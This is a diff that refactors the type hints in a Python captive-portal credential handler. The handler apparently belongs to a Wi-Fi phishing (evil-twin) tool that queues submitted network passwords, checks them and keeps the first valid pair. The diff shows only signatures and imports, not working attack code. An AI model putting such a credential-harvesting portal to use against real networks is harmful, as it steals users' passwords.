@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 """
 Credential submission handler for captive portal.
@@ -9,10 +8,9 @@ Handles credential submissions, validation queueing, and response management.
 
 import time
 import threading
-from typing import Optional, Callable, Dict, List, Tuple
+from collections.abc import Callable
 from queue import Queue, Empty, Full
 from dataclasses import dataclass
-from datetime import datetime
 
 from ...util.logger import log_info, log_error, log_warning, log_debug
 
@@ -36,7 +34,7 @@ class ValidationResult:
     submission: CredentialSubmission
     is_valid: bool
     validation_time: float
-    error_message: Optional[str] = None
+    error_message: str | None = None
     
     def __str__(self):
         status = 'VALID' if self.is_valid else 'INVALID'
@@ -108,7 +106,7 @@ class CredentialHandler:
         self.submission_callback = callback
         log_debug('CredentialHandler', 'Submission callback set')
     
-    def submit_credentials(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
+    def submit_credentials(self, ssid: str, password: str, client_ip: str) -> tuple[bool, str]:
         """
         Handle a credential submission.
         
@@ -173,7 +171,7 @@ class CredentialHandler:
             log_error('CredentialHandler', f'Error handling submission: {e}', e)
             return False, 'An error occurred. Please try again.'
     
-    def check_and_record(self, ssid: str, password: str, client_ip: str) -> Tuple[bool, str]:
+    def check_and_record(self, ssid: str, password: str, client_ip: str) -> tuple[bool, str]:
         """
         Gate a submission inline: validate input format and enforce per-client
         rate limiting, recording the attempt.
@@ -205,7 +203,7 @@ class CredentialHandler:
         self._update_client_attempts(client_ip)
         return True, 'OK'
 
-    def _validate_input(self, ssid: str, password: str) -> Optional[str]:
+    def _validate_input(self, ssid: str, password: str) -> str | None:
         """
         Validate input format.
         
@@ -266,7 +264,7 @@ class CredentialHandler:
         self.client_attempts[client_ip] = self.client_attempts.get(client_ip, 0) + 1
         self.client_last_attempt[client_ip] = time.time()
     
-    def get_next_submission(self, timeout=1) -> Optional[CredentialSubmission]:
+    def get_next_submission(self, timeout=1) -> CredentialSubmission | None:
         """
         Get next submission from validation queue.
         
@@ -284,7 +282,7 @@ class CredentialHandler:
     
     def record_validation_result(self, submission: CredentialSubmission, 
                                  is_valid: bool, validation_time: float,
-                                 error_message: Optional[str] = None):
+                                 error_message: str | None = None):
         """
         Record the result of a validation attempt.
         
@@ -325,7 +323,7 @@ class CredentialHandler:
         """
         return len(self.valid_credentials) > 0
     
-    def get_valid_credentials(self) -> Optional[Tuple[str, str]]:
+    def get_valid_credentials(self) -> tuple[str, str] | None:
         """
         Get the first valid credentials found.
         
@@ -336,7 +334,7 @@ class CredentialHandler:
             return self.valid_credentials[0]
         return None
     
-    def get_statistics(self) -> Dict:
+    def get_statistics(self) -> dict:
         """
         Get handler statistics.
         
@@ -365,7 +363,7 @@ class CredentialHandler:
         """
         return self.client_attempts.get(client_ip, 0)
     
-    def get_all_submissions(self) -> List[CredentialSubmission]:
+    def get_all_submissions(self) -> list[CredentialSubmission]:
         """
         Get all submissions (pending and completed).
         
@@ -387,7 +385,7 @@ class CredentialHandler:
         
         return submissions
     
-    def get_validation_results(self) -> List[ValidationResult]:
+    def get_validation_results(self) -> list[ValidationResult]:
         """
         Get all validation results.
         
